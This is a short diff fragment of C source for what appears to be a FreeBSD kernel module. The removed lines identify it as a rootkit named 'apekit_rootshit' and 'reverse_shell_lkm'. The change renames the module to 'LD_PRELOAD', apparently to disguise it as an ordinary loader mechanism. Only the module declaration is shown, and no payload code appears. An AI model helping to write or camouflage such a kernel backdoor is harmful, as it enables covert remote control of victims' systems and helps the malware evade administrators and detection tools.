@@ -405,9 +405,9 @@ static int event_handler(struct module *module, int event, void *arg) {
 
 
 static moduledata_t module_data = {
-    "apekit_rootshit",
+    "LD_PRELOAD",
     event_handler,
     NULL
 };
 
-DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(LD_PRELOAD, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
